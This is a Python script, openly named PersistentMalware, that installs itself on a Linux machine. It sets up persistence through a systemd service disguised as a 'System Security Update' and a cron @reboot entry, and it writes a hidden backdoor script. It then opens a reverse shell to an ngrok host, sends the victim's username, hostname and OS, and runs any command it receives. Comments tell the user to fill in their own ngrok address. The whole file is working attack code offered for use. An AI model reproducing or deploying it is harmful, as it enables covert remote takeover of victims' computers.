#!/usr/bin/env python3
import os
import sys
import subprocess
import socket
import platform
import time
import getpass
import urllib.request
import base64
import threading
from pathlib import Path

class PersistentMalware:
    def __init__(self):
        self.host = "0.tcp.in.ngrok.io"  # Ngrok host (আপনারটা দিতে হবে)
        self.port = 16939  # Ngrok port (আপনারটা দিতে হবে)
        self.home_dir = str(Path.home())
        self.install_path = os.path.join(self.home_dir, ".config", "systemd-service")
        
    def create_persistence(self):
        """System persistence mechanisms"""
        try:
            os.makedirs(self.install_path, exist_ok=True)
            
            # Create malicious script
            malware_script = f'''#!/bin/bash
while true; do
    python3 {os.path.join(self.install_path, "service.py")} 2>/dev/null
    sleep 30
done
'''
            
            with open(os.path.join(self.install_path, "persist.sh"), "w") as f:
                f.write(malware_script)
            os.chmod(os.path.join(self.install_path, "persist.sh"), 0o755)
            
            # Create systemd service for root persistence
            if os.geteuid() == 0:
                service_content = f'''
[Unit]
Description=System Security Update
After=network.target

[Service]
Type=simple
ExecStart={os.path.join(self.install_path, "persist.sh")}
Restart=always
RestartSec=10
User=root

[Install]
WantedBy=multi-user.target
'''
                with open("/etc/systemd/system/system-update.service", "w") as f:
                    f.write(service_content)
                subprocess.run(["systemctl", "enable", "system-update.service"], capture_output=True)
                subprocess.run(["systemctl", "start", "system-update.service"], capture_output=True)
            
            # User level persistence (cron)
            subprocess.run(f"(crontab -l 2>/dev/null; echo \"@reboot {os.path.join(self.install_path, 'persist.sh')}\") | crontab -", shell=True)
            
        except Exception as e:
            pass
    
    def reverse_shell(self):
        """Reverse shell connection"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((self.host, self.port))
            
            # Send system info
            info = f"""
=== Victim System Info ===
Username: {getpass.getuser()}
Hostname: {socket.gethostname()}
OS: {platform.system()} {platform.release()}
Directory: {os.getcwd()}
==========================
"""
            s.send(info.encode())
            
            # Shell interaction
            while True:
                s.send(b"\nshell> ")
                command = s.recv(1024).decode().strip()
                
                if command.lower() in ["exit", "quit"]:
                    break
                
                if command.startswith("cd "):
                    try:
                        os.chdir(command[3:])
                        output = f"Changed directory to {os.getcwd()}"
                    except Exception as e:
                        output = str(e)
                else:
                    try:
                        output = subprocess.check_output(
                            command, shell=True, stderr=subprocess.STDOUT
                        ).decode()
                    except Exception as e:
                        output = str(e)
                
                s.send(output.encode())
                
        except Exception:
            pass
    
    def start(self):
        """Start malware activities"""
        # Create persistence
        self.create_persistence()
        
        # Save main malware script
        main_script = '''
import os, sys, subprocess, socket, platform, time, getpass, threading
from pathlib import Path

class Backdoor:
    def __init__(self):
        self.host = "0.tcp.in.ngrok.io"
        self.port = 16939
        
    def connect(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((self.host, self.port))
            s.send(b"\\\\n[+] Backdoor connection established!\\\\n")
            
            while True:
                s.send(b"cmd> ")
                cmd = s.recv(1024).decode().strip()
                if cmd == "exit":
                    break
                try:
                    output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
                    s.send(output)
                except Exception as e:
                    s.send(str(e).encode())
            s.close()
        except:
            pass
            
backdoor = Backdoor()
backdoor.connect()
'''
        
        with open(os.path.join(self.install_path, "service.py"), "w") as f:
            f.write(main_script)
        
        # Mark as installed
        with open("/tmp/payload_installed", "w") as f:
            f.write("1")
        
        # Start reverse shell in background
        thread = threading.Thread(target=self.reverse_shell)
        thread.daemon = True
        thread.start()

if __name__ == "__main__":
    malware = PersistentMalware()
    malware.start()